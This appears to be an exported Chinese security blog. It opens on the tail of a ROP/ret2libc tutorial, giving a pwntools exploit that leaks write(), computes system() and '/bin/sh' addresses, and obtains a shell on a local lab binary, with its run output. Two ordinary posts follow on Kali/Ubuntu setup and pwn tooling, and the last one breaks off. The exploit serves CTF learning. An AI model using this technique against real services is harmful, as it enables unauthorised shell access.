+ hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###calculating system() addr and \"/bin/sh\" addr...###"</span></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr= '</span> + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_addr= '</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>接着我们使用<code>socat</code>把level2绑定到<code>10003端口</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10003,fork EXEC:./level2</span><br></pre></td></tr></table></figure><p>最后执行我们的exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ python level3_exp.py</span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x03/libc.so'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x03/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10003: Done</span><br><span class="line">write_plt= 0x8048320</span><br><span class="line">write_got= 0x804a014</span><br><span class="line">vulfun_addr= 0x8048471</span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload1 ...###</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###receving write() addr...###</span></span><br><span class="line">write_addr= 0xf7df3b70</span><br><span class="line"></span><br><span class="line"><span class="comment">###calculating system() addr and "/bin/sh" addr...###</span></span><br><span class="line">system_addr= 0xf7d58da0</span><br><span class="line">binsh_addr= 0xf7e79a0b</span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload2 ...###</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>本章简单介绍了<code>ROP攻击</code>的基本原理，由于篇幅原因，我们会在随后的文章中会介绍更多的攻击技巧：如何利用工具寻找<code>gadgets</code>，如何在<code>不知道对方libc.so版本</code>的情况下<code>计算offset</code>；如何<code>绕过Stack Protector</code>等。欢迎大家到时继续学习。另外本文提到的所有源代码和工具都可以从我的github下载：</p><div class="github-widget" data-repo="zhengmin1989/ROP_STEP_BY_STEP"></div><h3 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h3><blockquote><ol><li>The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)</li><li>picoCTF 2013: <a href="https://github.com/picoCTF/2013-Problems" target="_blank" rel="noopener">https://github.com/picoCTF/2013-Problems</a></li><li>Smashing The Stack For Fun And Profit: <a href="http://phrack.org/issues/49/14.html" target="_blank" rel="noopener">http://phrack.org/issues/49/14.html</a></li><li>程序员的自我修养</li><li>ROP轻松谈</li></ol></blockquote>]]></content>
      
      <categories>
          
          <category> 备份 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kali2018-搜狗输入法安装</title>
      <link href="/2018/04/08/Kali2018-%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E5%AE%89%E8%A3%85/"/>
      <url>/2018/04/08/Kali2018-%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E5%AE%89%E8%A3%85/</url>
      <content type="html"><![CDATA[<blockquote><p>有点无语，Kali虚拟机也崩了，和Ubuntu一个情况。<br>以前版本的Kali安装搜狗输入法还是没有多大问题的，kali更新了fcitx<br>官方废弃了两个搜狗输入法需要的依赖包：fcitx-libs和fcitx-libs-qt，不需要这俩依赖就能运行。<br><a id="more"></a></p></blockquote><h3 id="Kali-Linux版本为2018以前的"><a href="#Kali-Linux版本为2018以前的" class="headerlink" title="Kali Linux版本为2018以前的"></a>Kali Linux版本为2018以前的</h3><p>Kali Linux2018以前的版本需要安装<code>fcitx-libs</code>和<code>fcitx-libs-qt</code>，因为搜狗输入法是基于<code>fcitx</code>的。</p><h4 id="fcitx安装"><a href="#fcitx安装" class="headerlink" title="fcitx安装"></a>fcitx安装</h4><blockquote><p><code>fcitx介绍</code><br>Fcitx是 (Free Chinese Input Toy for X) 的英文缩写，中文名为小企鹅输入法，是一个以 GPL 方式发布的输入法框架， 编写它的目是为桌面环境提供一个灵活的输入方案，彻底解决在GNU/Linux下没有一个好的中文输入法的问题。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#换完源之后执行</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install fcitx</span><br><span class="line">sudo apt-get install fcitx-libs</span><br><span class="line">sudo apt-get install fcitx-libs-qt</span><br></pre></td></tr></table></figure><p>顺利的话会自动安装成功，如果遇到依赖错误，按提示修复或者输入<code>apt-get -f install</code> 修复，但是如果提示“依赖xxx，但是xxx将不会被安装”，这一般是源太旧，建议换个其他的源。</p><h4 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h4><p>搜狗输入法 for Linux下载官方网站：<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/</a><br>下载和自己系统版本对应的<code>deb包</code>，我这里下载的是64bit的。<br>然后执行下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Downloads/</span><br><span class="line">dpkg -i 下载的搜狗输入法软件包名</span><br></pre></td></tr></table></figure><p>如果提示有软件包依赖的问题，根据提示执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get --fix-broken install</span><br></pre></td></tr></table></figure><p>然后<code>reboot</code>重启Kali，重新开机后就可以使用搜狗输入法了，可以使用ctrl+空格 或者 Ctrl+shift进行切换输入法。如果还是不行，去<code>fcitx配置</code>里将搜狗输入法设为默认输入法应该就可以了。</p><h3 id="Kali-Linux-2018安装搜狗输入法"><a href="#Kali-Linux-2018安装搜狗输入法" class="headerlink" title="Kali Linux 2018安装搜狗输入法"></a>Kali Linux 2018安装搜狗输入法</h3><p>由于Kali2018更新了fcitx的版本，删除了<code>fcitx-libs</code>和<code>fcitx-libs-qt</code>这两个依赖，所以我们要将deb包打开，删除掉这两个依赖，<code>重新打包</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#下载搜狗deb包</span><br><span class="line">wget -O sogoupinyin_2.2.0.0102_amd64.deb &quot;http://pinyin.sogou.com/linux/download.php?f=linux&amp;bit=64&quot;</span><br><span class="line"></span><br><span class="line">#创建解压后软件包目录，-p参数表示如果父目录不存在就创建父目录</span><br><span class="line">mkdir -p extract/DEBIAN</span><br><span class="line"></span><br><span class="line">#将所有文件解压到extract下</span><br><span class="line">dpkg-deb -x sogoupinyin_2.2.0.0102_amd64.deb extract/</span><br><span class="line"></span><br><span class="line">#将主控信息解压到extract下的DEBIAN文件夹下</span><br><span class="line">dpkg-deb -e sogoupinyin_2.2.0.0102_amd64.deb extract/DEBIAN</span><br><span class="line"></span><br><span class="line">#用vim打开extract/DEBIAN/下的control文件，找到Depends行，去除fcitx-libs和fcitx-libs-qt相关信息，保存退出</span><br><span class="line">vim extract/DEBIAN/control</span><br><span class="line"></span><br><span class="line">#新建打包目录</span><br><span class="line">mkdir build</span><br><span class="line"></span><br><span class="line">#重新打包</span><br><span class="line">dpkg-deb -b extract/ build/</span><br><span class="line"></span><br><span class="line">#安装搜狗输入法</span><br><span class="line">dpkg -i build/sogoupinyin_2.1.0.0086_amd64.deb</span><br></pre></td></tr></table></figure><div align="left"><br>    <img src="/resources/2018/2018-04-08-00.png" alt="control"><br></div><p>然后reboot重启一下，重新开机就可以使用了。不能使用也是要设置一下fcitx配置。</p><h3 id="搜狗输入法候选框乱码"><a href="#搜狗输入法候选框乱码" class="headerlink" title="搜狗输入法候选框乱码"></a>搜狗输入法候选框乱码</h3><p>删除～/.config中所有与搜狗输入法有关的文件或文件夹，reboot就好了。</p>]]></content>
      
      <categories>
          
          <category> 备忘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn环境搭建——Ubuntu16.04</title>
      <link href="/2018/04/05/Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-Ubuntu16.04/"/>
      <url>/2018/04/05/Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-Ubuntu16.04/</url>
      <content type="html"><![CDATA[<blockquote><p>有点无语，Ubuntu虚拟机崩了，据我估计应该是VMware14的问题。<br>虚拟机打不开，一直黑屏状态，实在没办法了才删了重新装一遍。<br>写这篇博客的目的就是记录一下安装的过程和安装中遇到的问题！！！<br><a id="more"></a></p></blockquote><p>&emsp;&emsp;前面我的虚拟机是用 <code>VMware12pro</code>建的，然后重新安装了物理机的系统，就把VMware换成<code>VMware14pro</code>了。前一段时间，一个朋友问我遇到过虚拟机黑屏打不开是怎么回事，因为之前也没遇到过，所以我也不知道。直到最近我才遇到了这个问题，因为之前用VMware12建的，不知道是因为在VMware14下打开VMware12的虚拟机导致的(<strong>硬件兼容性</strong>)，还是由于VMware14本身的原因。我在网上搜索了一下，很多用VMware14的人都遇到过这种问题，也找到了一些解决方法，但是我都没成功，所以只能狠心重装了。</p><h2 id="Ubuntu基本环境搭建"><a href="#Ubuntu基本环境搭建" class="headerlink" title="Ubuntu基本环境搭建"></a>Ubuntu基本环境搭建</h2><blockquote><p><code>环境描述</code>:<br>1、VMware Workstations 12 Pro 下载地址：<a href="https://pan.baidu.com/s/11HZr3mv5GX1lCjmv1_ZuIQ" target="_blank" rel="noopener">https://pan.baidu.com/s/11HZr3mv5GX1lCjmv1_ZuIQ</a><br>2、Ubuntu16.04  下载地址：<a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">https://www.ubuntu.com/download/desktop</a><br>3、换源<br>4、VMware-Tools、aptitude、vim、搜狗输入法、oh-my-zsh等软件的安装</p></blockquote><h3 id="Ubuntu16-04虚拟机的安装"><a href="#Ubuntu16-04虚拟机的安装" class="headerlink" title="Ubuntu16.04虚拟机的安装"></a>Ubuntu16.04虚拟机的安装</h3><p>这样的文章很多，我就不写了，写了也没啥意义，还浪费时间。这里粘一个别人写的文章的链接。<a href="https://blog.csdn.net/colin_lisicong/article/details/70193539" target="_blank" rel="noopener">VMware 12Pro安装Ubuntu16.04</a></p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>由于Ubuntu官方的源是国外的，所以速度很慢，要把它换成国内的镜像站，那样,不管是更新、还是安装软件，都是比较快的。</p><p><code>官方源</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-updates main restricted</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial universe</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial universe</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-updates universe</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial multiverse</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-updates multiverse</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"># deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line"># deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://security.ubuntu.com/ubuntu xenial-security main restricted</span><br><span class="line"># deb-src http://security.ubuntu.com/ubuntu xenial-security main restricted</span><br><span class="line">deb http://security.ubuntu.com/ubuntu xenial-security universe</span><br><span class="line"># deb-src http://security.ubuntu.com/ubuntu xenial-security universe</span><br><span class="line">deb http://security.ubuntu.com/ubuntu xenial-security multiverse</span><br><span class="line"># deb-src http://security.ubuntu.com/ubuntu xenial-security multiverse</span><br></pre></td></tr></table></figure></p><p>就贴一个官方的，网上搜了下也没搜见完整的官方源，我把注释都去了</p><table><thead><tr><th style="text-align:center">源名称</th><th style="text-align:center">源链接</th></tr></thead><tbody><tr><td style="text-align:center"><strong><code>清华源</code></strong></td><td style="text-align:center"><a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>网易源</code></strong></td><td style="text-align:center"><a href="http://mirrors.163.com/" target="_blank" rel="noopener">http://mirrors.163.com/</a></td></tr><tr><td style="text-align:center"><strong><code>中科大源</code></strong></td><td style="text-align:center"><a href="http://mirrors.ustc.edu.cn/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>阿里源</code></strong></td><td style="text-align:center"><a href="https://opsx.alibaba.com/mirror/" target="_blank" rel="noopener">https://opsx.alibaba.com/mirror/</a></td></tr><tr><td style="text-align:center"><strong><code>搜狐源</code></strong></td><td style="text-align:center"><a href="http://mirrors.sohu.com/" target="_blank" rel="noopener">http://mirrors.sohu.com/</a></td></tr><tr><td style="text-align:center"><strong><code>华科大源</code></strong></td><td style="text-align:center"><a href="http://mirror.hust.edu.cn/" target="_blank" rel="noopener">http://mirror.hust.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>浙大源</code></strong></td><td style="text-align:center"><a href="http://mirrors.zju.edu.cn/" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>上海交大源</code></strong></td><td style="text-align:center"><a href="http://ftp.sjtu.edu.cn/" target="_blank" rel="noopener">http://ftp.sjtu.edu.cn/</a></td></tr></tbody></table><p>每个开源镜像站都有介绍不同版本的Linux的源的使用方式，访问上述网址就行了。首先找到/etc/apt下的sources.list,先将其备份一个，然后将上述镜像站的源替换sources.list里的官方源并保存。然后执行下面两条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update 更新源  </span><br><span class="line">sudo apt-get upgrade 更新软件</span><br></pre></td></tr></table></figure></p><h3 id="安装open-vm-tools"><a href="#安装open-vm-tools" class="headerlink" title="安装open-vm-tools"></a>安装open-vm-tools</h3><p>前面安装的是VMware提供的<code>VMware Tools</code>,但是不能自适应客户机也不能进行文件复制，相当于没有安装，哈哈哈。记得之前有一个工具可以替代VMware Tools，名字也想不起来了就上网搜了下，是<a href="https://kb.vmware.com/s/article/2095783" target="_blank" rel="noopener">open-vm-tools</a>.而且当你安装VMware Tools的时候也会提醒你安装<code>open-vm-tools</code>.安装前先将VMware Tools卸载。Ubuntu14.04及以上版本，都建议安装这个工具。安装使用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#desktop</span><br><span class="line">sudo apt-get install open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop</span><br><span class="line">#server or headless</span><br><span class="line">sudo apt-get install open-vm-tools</span><br></pre></td></tr></table></figure></p><p>安装完重启就可以进行文件复制，并且可以自适应客户机。安装过程可参考这篇文章<br><a href="https://jingyan.baidu.com/article/54b6b9c0982f2f2d593b4762.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/54b6b9c0982f2f2d593b4762.html</a></p><h3 id="安装aptitude-Debian系统的包管理工具"><a href="#安装aptitude-Debian系统的包管理工具" class="headerlink" title="安装aptitude(Debian系统的包管理工具)"></a>安装aptitude(Debian系统的包管理工具)</h3><p>Ubuntu是基于<code>Debian</code>的一个Linux发行版。</p><blockquote><p><strong><code>aptitude介绍</code></strong><br>aptitude与 <code>apt-get</code> 一样，是 Debian 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。(百度百科)</p></blockquote><p>安装aptitude很简单，只需一条命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aptitude</span><br></pre></td></tr></table></figure></p><p>但是我遇到了软件包依赖缺失，导致安装不成功。上网搜了下，说换成官方源可以，就换成官方源试了试，果然成功安装，666。换完源执行以下两条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update 更新源</span><br><span class="line">sudo apt-get install aptitude   安装aptitude</span><br></pre></td></tr></table></figure></p><h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><p>这个也很简单，先下载Linux版的deb包，按照自己所安装系统的位数下载，然后运行下面一条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i deb包的名字</span><br></pre></td></tr></table></figure></p><p>但是会出错，因为有依赖问题，解决方案可以看这两篇博客<br><a href="https://www.cnblogs.com/lrj567/p/6307329.html" target="_blank" rel="noopener">Ubuntu 16.04 LTS安装sogou输入法详解</a><br><a href="https://blog.csdn.net/u013894834/article/details/60357071" target="_blank" rel="noopener">Ubuntu16.04安装搜狗输入法</a></p><h3 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h3><p>本来一条命令就可以安装成功，但还是出现了问题，依旧是依赖问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure></p><p>参考链接：<a href="http://www.cnblogs.com/wangyarui/p/6055369.html" target="_blank" rel="noopener">http://www.cnblogs.com/wangyarui/p/6055369.html</a><br>记得还有一个问题，当时也没记录，当时是安装完aptitude，源是官方的，然后没安装成功，换成清华源后安装成功了。</p><h3 id="安装zsh与oh-my-zsh"><a href="#安装zsh与oh-my-zsh" class="headerlink" title="安装zsh与oh-my-zsh"></a>安装zsh与oh-my-zsh</h3><p>我安装这个是为了看起来更加舒服一点，查了一下，zsh的功能很强大，可以说比普通的bash shell好用多了，有兴趣的可以看看。oh-my-zsh具有各种各样的主题，超好看。我用的是agnoster主题，安装完有乱码，是字体的原因，需要安装powerline字体。一些链接如下：<br><a href="http://ohmyz.sh/" target="_blank" rel="noopener">oh-my-zsh官网</a>  </p><p><code>oh-my-zsh源码和主题</code></p><div class="github-widget" data-repo="robbyrussell/oh-my-zsh"></div><p><code>powerline字体</code></p><div class="github-widget" data-repo="supermarin/powerline-fonts"></div><p><a href="https://blog.csdn.net/u011781521/article/details/53861497" target="_blank" rel="noopener">安装参考链接</a></p><blockquote><p><strong><code>问题</code></strong><br>curl: (7) Failed to connect to 127.0.0.1 port 35787: 拒绝连接<br>这个是由于啥时候设置了代理，取消了就好了，很迷(应该不是我设的)<br><strong><code>建议</code></strong><br>zsh在root用户和普通用户下都可以设置，但只建议设置普通用户下的</p></blockquote><h2 id="Pwn环境搭建"><a href="#Pwn环境搭建" class="headerlink" title="Pwn环境搭建"></a>Pwn环境搭建</h2><blockquote><p><strong><code>基本工具</code></strong>：</p><ul><li>gdb+peda+pwndbg、gcc、Pwntools、Binutils</li><li>Capstone、gcc-multilib、socat、rp++、readelf</li><li>ROPgaget、libc-database、objdump、file、string、checksec</li></ul></blockquote><p>这么多工具，其实这才是一点点，还有好多工具现在我还不知道。先说一下<code>Pwntools</code>吧。Pwntools是一个CTF框架和漏洞利用开发库，它使用Python编写的，由rapid设计并维护，设计这个框架的目的是为了让使用者简单快速的编写exploit。对Pwntools支持最好的是64bits的Ubuntu LTE Realease(12.04、14.04、16.04)，所以我选择了在Ubuntu16.04下安装这个框架，Python环境是Python2.7。但是绝大多数的功能也支持Debian, Arch, FreeBSD, OSX, 等等。安装Pwntools成功的前提是安装了git、pip、Binutils、Capstone、Python-Dev等库和工具。</p><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>pip是Python的一个<code>包管理工具</code>，用于安装和卸载Python的扩展模块。如果你使用的Python 2 &gt;=2.7.9或Python 3 &gt;=3.4并且从python.org下载，那么pip已经安装了，但是需要<code>升级pip</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#安装pip</span><br><span class="line">sudo apt-get update #更新源</span><br><span class="line">sudo apt-get install python-pip #安装pip，可能会有依赖问题，记不清了</span><br><span class="line">pip --version   #查看pip版本，确认是否安装成功</span><br><span class="line">#升级pip</span><br><span class="line">sudo pip install --upgrade pip  #Linux or MacOS</span><br><span class="line">python -m pip install -U pip    #windows</span><br></pre></td></tr></table></figure><p>pip常用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip --help #查看帮助菜单</span><br><span class="line">pip install packageName #安装新的python包</span><br><span class="line">pip uninstall packageName #卸载python包</span><br><span class="line">pip search packageName  #寻找python包</span><br></pre></td></tr></table></figure></p><h3 id="安装git-分布式版本控制系统"><a href="#安装git-分布式版本控制系统" class="headerlink" title="安装git(分布式版本控制系统)"></a>安装git(分布式版本控制系统)</h3><p><code>Git</code>是一个开源的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件(百度百科)。 通过这个工具,我们可以下载和上传一些开源软件的源代码，非常方便。这些代码都是保存在Github上的仓库中。</p><blockquote><p><code>Github与Git的区别</code><br>Git，开发者将源代码存入名叫“Git 仓库”的资料库中并加以使用。而 GitHub 则是在网络上提供 Git 仓库的一项服务。也就是说，GitHub 上公开的软件源代码全都由 Git 进行管理。理解 Git，是熟练运用 GitHub 的关键所在。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#安装git工具</span><br><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h3 id="Capstone"><a href="#Capstone" class="headerlink" title="Capstone"></a>Capstone</h3><blockquote><p><code>Capstone介绍</code><br>Capstone是一个反汇编框架，它的目标是成为最好的反汇编引擎，它是为安全社区中的研究人员进行二进制分析和逆向提供服务的。Core (Arm, Arm64, M68K, Mips, PPC, Sparc, SystemZ, X86, X86_64, XCore) + bindings (Python, Java, Ocaml, PowerShell)</p></blockquote><div class="github-widget" data-repo="aquynh/capstone"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#安装Capstone</span><br><span class="line">git clone http://github.com/aquynh/capstone #下载Capstone源码到本地</span><br><span class="line">cd capstone</span><br><span class="line">make    #编译源文件</span><br><span class="line">sudo make install   #编译并安装</span><br></pre></td></tr></table></figure><h3 id="安装Binutils"><a href="#安装Binutils" class="headerlink" title="安装Binutils"></a>安装Binutils</h3><blockquote><p><code>Binutils简介</code><br>GNU Binutils 是一组开发工具，包括连接器，汇编器和其他用于目标文件和档案的工具。包括下列程序: addr2line, ar, as, c++filt, gprof, ld, nm, objcopy, objdump, ranlib, readelf, size, strings 和 strip。<a href="ftp://ftp.gnu.org/gnu/binutils" target="_blank" rel="noopener">下载链接</a></p></blockquote><p>Ubuntu16.04默认是安装了Binutils的，所以如果版本太老了可以选择更新一下。外国架构的组装(例如，在Mac OS X上装配Sparc shell)需要安装跨编译的binutils版本。</p><p><code>编译安装法</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/binutils/binutils-2.25.1.tar.bz2    </span><br><span class="line">tar -xvf binutils-2.25.1.tar.bz2    </span><br><span class="line">mkdir -v ../binutils-build  #binutils官方推荐编译binutils要和源码分离</span><br><span class="line">cd ../binutils-build</span><br><span class="line">../binutils-2.20/configure --prefix=/tools --target=$LFS_TGT --disable-nls --disable-werror</span><br><span class="line">make    #编译</span><br><span class="line">make install    #编译并安装</span><br></pre></td></tr></table></figure></p><p>configure参数可参照这个链接。<a href="http://www.jinbuguo.com/linux/glibc-gcc-binutils.html" target="_blank" rel="noopener">http://www.jinbuguo.com/linux/glibc-gcc-binutils.html</a></p><p><code>Pwntools手册</code>提供的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install software-properties-common</span><br><span class="line">$ apt-add-repository ppa:pwntools/binutils</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install binutils-$ARCH-linux-gnu  # $ARCH代表处理器架构</span><br></pre></td></tr></table></figure><p>试了apt-get install binutils-x86_64-linux-gnu,显示找不到安装包。看了pcat大佬的博客知道了在github上有一个pwntools-binutils的项目。</p><p><code>pwntools-binutils安装</code></p><div class="github-widget" data-repo="Gallopsled/pwntools-binutils"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git 